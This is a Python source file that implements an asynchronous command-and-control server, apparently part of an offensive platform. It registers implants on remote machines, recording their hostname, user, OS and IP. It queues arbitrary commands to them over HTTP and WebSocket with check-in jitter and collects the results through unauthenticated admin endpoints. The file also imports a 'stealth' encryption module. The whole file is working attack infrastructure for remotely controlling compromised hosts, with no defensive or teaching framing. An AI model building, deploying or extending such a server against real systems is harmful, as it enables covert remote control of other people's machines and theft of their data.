"""
C2 (Command & Control) Server for Ultimate OT-AFP Platform
"""

import asyncio
import json
import logging
import ssl
import time
import uuid
from typing import Dict, List, Optional, Any, Set
from dataclasses import dataclass, asdict
from pathlib import Path
import aiohttp
from aiohttp import web, WSMsgType
import aiofiles

from ...core.config import settings
from ...core.security import stealth_encryption

logger = logging.getLogger(__name__)

@dataclass
class Implant:
    """C2 Implant information"""
    implant_id: str
    hostname: str
    username: str
    os_info: str
    ip_address: str
    first_seen: float
    last_checkin: float
    version: str
    capabilities: List[str]
    status: str = "active"

@dataclass
class C2Task:
    """C2 Task for implants"""
    task_id: str
    implant_id: str
    command: str
    args: Dict[str, Any]
    priority: int
    created_at: float
    status: str = "pending"
    result: Optional[Any] = None
    error: Optional[str] = None

class C2Server:
    """Advanced Command & Control Server"""
    
    def __init__(self):
        self.app = None
        self.runner = None
        self.site = None
        self.implants: Dict[str, Implant] = {}
        self.tasks: Dict[str, C2Task] = {}
        self.websockets: Dict[str, aiohttp.web.WebSocketResponse] = {}
        self.running = False
        self.host = "0.0.0.0"
        self.port = settings.C2_PORT
        self.ssl_context = None
        logger.info("🎛️ C2 Server initialized")
    
    async def start(self):
        """Start the C2 server"""
        try:
            if self.running:
                logger.warning("⚠️ C2 Server already running")
                return
            
            # Create SSL context if certificates provided
            if settings.C2_SSL_CERT and settings.C2_SSL_KEY:
                self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                self.ssl_context.load_cert_chain(settings.C2_SSL_CERT, settings.C2_SSL_KEY)
            
            # Create web application
            self.app = web.Application()
            self._setup_routes()
            
            # Start server
            self.runner = web.AppRunner(self.app)
            await self.runner.setup()
            
            self.site = web.TCPSite(
                self.runner, 
                self.host, 
                self.port,
                ssl_context=self.ssl_context
            )
            
            await self.site.start()
            self.running = True
            
            protocol = "https" if self.ssl_context else "http"
            logger.info(f"🚀 C2 Server started on {protocol}://{self.host}:{self.port}")
            
            # Start background tasks
            asyncio.create_task(self._cleanup_stale_implants())
            asyncio.create_task(self._task_distributor())
            
        except Exception as e:
            logger.error(f"❌ Failed to start C2 Server: {e}")
            raise
    
    async def stop(self):
        """Stop the C2 server"""
        try:
            self.running = False
            
            # Close all WebSocket connections
            for ws in list(self.websockets.values()):
                if not ws.closed:
                    await ws.close()
            
            # Stop the server
            if self.site:
                await self.site.stop()
            
            if self.runner:
                await self.runner.cleanup()
            
            logger.info("🛑 C2 Server stopped")
            
        except Exception as e:
            logger.error(f"❌ Error stopping C2 Server: {e}")
    
    def _setup_routes(self):
        """Setup C2 server HTTP routes"""
        # Implant communication routes
        self.app.router.add_post('/api/register', self.handle_implant_register)
        self.app.router.add_post('/api/checkin', self.handle_implant_checkin)
        self.app.router.add_get('/api/tasks/{implant_id}', self.handle_get_tasks)
        self.app.router.add_post('/api/results', self.handle_task_results)
        
        # WebSocket for real-time communication
        self.app.router.add_get('/ws/{implant_id}', self.handle_websocket)
        
        # Admin interface routes
        self.app.router.add_get('/admin/implants', self.handle_list_implants)
        self.app.router.add_post('/admin/task', self.handle_create_task)
        self.app.router.add_get('/admin/status', self.handle_server_status)
        
        # Static files for admin interface
        self.app.router.add_static('/', path='static/', name='static')
    
    async def handle_implant_register(self, request: web.Request) -> web.Response:
        """Handle implant registration"""
        try:
            data = await request.json()
            
            # Create new implant
            implant = Implant(
                implant_id=str(uuid.uuid4()),
                hostname=data.get('hostname', 'unknown'),
                username=data.get('username', 'unknown'),
                os_info=data.get('os_info', 'unknown'),
                ip_address=request.remote,
                first_seen=time.time(),
                last_checkin=time.time(),
                version=data.get('version', '1.0.0'),
                capabilities=data.get('capabilities', [])
            )
            
            self.implants[implant.implant_id] = implant
            
            logger.info(f"🤖 New implant registered: {implant.hostname} ({implant.implant_id})")
            
            return web.json_response({
                'status': 'success',
                'implant_id': implant.implant_id,
                'checkin_interval': 60,  # seconds
                'jitter': 30  # seconds
            })
            
        except Exception as e:
            logger.error(f"❌ Implant registration failed: {e}")
            return web.json_response({'status': 'error', 'message': str(e)}, status=500)
    
    async def handle_implant_checkin(self, request: web.Request) -> web.Response:
        """Handle implant check-in"""
        try:
            data = await request.json()
            implant_id = data.get('implant_id')
            
            if implant_id not in self.implants:
                return web.json_response({'status': 'error', 'message': 'Unknown implant'}, status=404)
            
            # Update implant status
            implant = self.implants[implant_id]
            implant.last_checkin = time.time()
            implant.status = "active"
            
            # Process any system information updates
            if 'system_info' in data:
                system_info = data['system_info']
                implant.ip_address = system_info.get('ip_address', implant.ip_address)
                # Update other system information as needed
            
            logger.debug(f"📞 Implant checked in: {implant.hostname}")
            
            return web.json_response({
                'status': 'success',
                'timestamp': time.time()
            })
            
        except Exception as e:
            logger.error(f"❌ Implant checkin failed: {e}")
            return web.json_response({'status': 'error', 'message': str(e)}, status=500)
    
    async def handle_get_tasks(self, request: web.Request) -> web.Response:
        """Get pending tasks for an implant"""
        try:
            implant_id = request.match_info['implant_id']
            
            if implant_id not in self.implants:
                return web.json_response({'status': 'error', 'message': 'Unknown implant'}, status=404)
            
            # Get pending tasks for this implant
            pending_tasks = []
            for task in self.tasks.values():
                if task.implant_id == implant_id and task.status == "pending":
                    pending_tasks.append({
                        'task_id': task.task_id,
                        'command': task.command,
                        'args': task.args,
                        'priority': task.priority
                    })
                    # Mark task as sent
                    task.status = "sent"
            
            return web.json_response({
                'status': 'success',
                'tasks': pending_tasks
            })
            
        except Exception as e:
            logger.error(f"❌ Get tasks failed: {e}")
            return web.json_response({'status': 'error', 'message': str(e)}, status=500)
    
    async def handle_task_results(self, request: web.Request) -> web.Response:
        """Handle task execution results from implants"""
        try:
            data = await request.json()
            task_id = data.get('task_id')
            
            if task_id not in self.tasks:
                return web.json_response({'status': 'error', 'message': 'Unknown task'}, status=404)
            
            task = self.tasks[task_id]
            task.status = data.get('status', 'completed')
            task.result = data.get('result')
            task.error = data.get('error')
            
            logger.info(f"📋 Task result received: {task_id} - Status: {task.status}")
            
            # Notify admin interface via WebSocket if connected
            await self._notify_admin_task_completed(task)
            
            return web.json_response({'status': 'success'})
            
        except Exception as e:
            logger.error(f"❌ Task results handling failed: {e}")
            return web.json_response({'status': 'error', 'message': str(e)}, status=500)
    
    async def handle_websocket(self, request: web.Request) -> web.WebSocketResponse:
        """Handle WebSocket connections from implants"""
        ws = web.WebSocketResponse()
        await ws.prepare(request)
        
        implant_id = request.match_info['implant_id']
        
        if implant_id not in self.implants:
            await ws.close(code=aiohttp.WSMsgType.ERROR, message=b'Unknown implant')
            return ws
        
        self.websockets[implant_id] = ws
        logger.info(f"🔌 WebSocket connected: {implant_id}")
        
        try:
            async for msg in ws:
                if msg.type == WSMsgType.TEXT:
                    data = json.loads(msg.data)
                    await self._handle_websocket_message(implant_id, data)
                elif msg.type == WSMsgType.ERROR:
                    logger.error(f'WebSocket error: {ws.exception()}')
                    break
        
        except Exception as e:
            logger.error(f"❌ WebSocket error for {implant_id}: {e}")
        
        finally:
            if implant_id in self.websockets:
                del self.websockets[implant_id]
            logger.info(f"🔌 WebSocket disconnected: {implant_id}")
        
        return ws
    
    async def _handle_websocket_message(self, implant_id: str, data: Dict[str, Any]):
        """Handle WebSocket message from implant"""
        try:
            msg_type = data.get('type')
            
            if msg_type == 'heartbeat':
                # Update last checkin time
                if implant_id in self.implants:
                    self.implants[implant_id].last_checkin = time.time()
                
                # Send heartbeat response
                await self._send_websocket_message(implant_id, {
                    'type': 'heartbeat_ack',
                    'timestamp': time.time()
                })
            
            elif msg_type == 'real_time_data':
                # Handle real-time data from implant
                await self._process_real_time_data(implant_id, data.get('payload'))
            
            elif msg_type == 'alert':
                # Handle security alerts from implant
                await self._process_security_alert(implant_id, data.get('alert'))
                
        except Exception as e:
            logger.error(f"❌ WebSocket message handling failed: {e}")
    
    async def _send_websocket_message(self, implant_id: str, message: Dict[str, Any]):
        """Send message to implant via WebSocket"""
        if implant_id in self.websockets:
            ws = self.websockets[implant_id]
            if not ws.closed:
                await ws.send_str(json.dumps(message))
    
    async def handle_list_implants(self, request: web.Request) -> web.Response:
        """Admin endpoint to list all implants"""
        try:
            implants_data = []
            for implant in self.implants.values():
                implant_dict = asdict(implant)
                implant_dict['connected'] = implant.implant_id in self.websockets
                implants_data.append(implant_dict)
            
            return web.json_response({
                'status': 'success',
                'implants': implants_data
            })
            
        except Exception as e:
            logger.error(f"❌ List implants failed: {e}")
            return web.json_response({'status': 'error', 'message': str(e)}, status=500)
    
    async def handle_create_task(self, request: web.Request) -> web.Response:
        """Admin endpoint to create tasks for implants"""
        try:
            data = await request.json()
            
            task = C2Task(
                task_id=str(uuid.uuid4()),
                implant_id=data['implant_id'],
                command=data['command'],
                args=data.get('args', {}),
                priority=data.get('priority', 1),
                created_at=time.time()
            )
            
            self.tasks[task.task_id] = task
            
            logger.info(f"📋 New task created: {task.command} for {task.implant_id}")
            
            # If implant is connected via WebSocket, send immediately
            if task.implant_id in self.websockets:
                await self._send_websocket_message(task.implant_id, {
                    'type': 'new_task',
                    'task': {
                        'task_id': task.task_id,
                        'command': task.command,
                        'args': task.args,
                        'priority': task.priority
                    }
                })
                task.status = "sent"
            
            return web.json_response({
                'status': 'success',
                'task_id': task.task_id
            })
            
        except Exception as e:
            logger.error(f"❌ Create task failed: {e}")
            return web.json_response({'status': 'error', 'message': str(e)}, status=500)
    
    async def handle_server_status(self, request: web.Request) -> web.Response:
        """Admin endpoint to get server status"""
        try:
            status = {
                'status': 'running' if self.running else 'stopped',
                'implant_count': len(self.implants),
                'active_connections': len(self.websockets),
                'pending_tasks': len([t for t in self.tasks.values() if t.status == 'pending']),
                'total_tasks': len(self.tasks),
                'uptime': time.time(),  # Would calculate actual uptime
                'server_info': {
                    'host': self.host,
                    'port': self.port,
                    'ssl_enabled': self.ssl_context is not None
                }
            }
            
            return web.json_response(status)
            
        except Exception as e:
            logger.error(f"❌ Server status failed: {e}")
            return web.json_response({'status': 'error', 'message': str(e)}, status=500)
    
    async def _cleanup_stale_implants(self):
        """Background task to cleanup stale implants"""
        while self.running:
            try:
                current_time = time.time()
                stale_threshold = 300  # 5 minutes
                
                stale_implants = []
                for implant_id, implant in self.implants.items():
                    if current_time - implant.last_checkin > stale_threshold:
                        implant.status = "stale"
                        stale_implants.append(implant_id)
                
                if stale_implants:
                    logger.warning(f"⚠️ Marked {len(stale_implants)} implants as stale")
                
                await asyncio.sleep(60)  # Check every minute
                
            except Exception as e:
                logger.error(f"❌ Implant cleanup error: {e}")
                await asyncio.sleep(60)
    
    async def _task_distributor(self):
        """Background task to distribute tasks to implants"""
        while self.running:
            try:
                # Process high-priority tasks first
                pending_tasks = [t for t in self.tasks.values() if t.status == "pending"]
                pending_tasks.sort(key=lambda x: x.priority, reverse=True)
                
                for task in pending_tasks[:10]:  # Process up to 10 tasks per cycle
                    if task.implant_id in self.websockets:
                        await self._send_websocket_message(task.implant_id, {
                            'type': 'new_task',
                            'task': {
                                'task_id': task.task_id,
                                'command': task.command,
                                'args': task.args,
                                'priority': task.priority
                            }
                        })
                        task.status = "sent"
                
                await asyncio.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                logger.error(f"❌ Task distribution error: {e}")
                await asyncio.sleep(30)
    
    async def _notify_admin_task_completed(self, task: C2Task):
        """Notify admin interface about completed task"""
        # This would send to admin WebSocket connections
        pass
    
    async def _process_real_time_data(self, implant_id: str, data: Dict[str, Any]):
        """Process real-time data from implants"""
        logger.info(f"📊 Real-time data from {implant_id}: {data}")
        # Process and store real-time data
    
    async def _process_security_alert(self, implant_id: str, alert: Dict[str, Any]):
        """Process security alerts from implants"""
        logger.warning(f"🚨 Security alert from {implant_id}: {alert}")
        # Process security alerts and trigger responses
    
    # Public API methods
    async def send_command(self, implant_id: str, command: str, args: Dict[str, Any] = None) -> str:
        """Send command to specific implant"""
        task = C2Task(
            task_id=str(uuid.uuid4()),
            implant_id=implant_id,
            command=command,
            args=args or {},
            priority=2,
            created_at=time.time()
        )
        
        self.tasks[task.task_id] = task
        return task.task_id
    
    def get_implant_status(self, implant_id: str) -> Optional[Dict[str, Any]]:
        """Get status of specific implant"""
        if implant_id in self.implants:
            implant = self.implants[implant_id]
            return {
                **asdict(implant),
                'connected': implant_id in self.websockets
            }
        return None
    
    def get_server_metrics(self) -> Dict[str, Any]:
        """Get C2 server metrics"""
        return {
            'implant_count': len(self.implants),
            'active_connections': len(self.websockets),
            'total_tasks': len(self.tasks),
            'pending_tasks': len([t for t in self.tasks.values() if t.status == 'pending']),
            'completed_tasks': len([t for t in self.tasks.values() if t.status == 'completed']),
            'running': self.running
        }

# Global C2 server instance
c2_server = C2Server()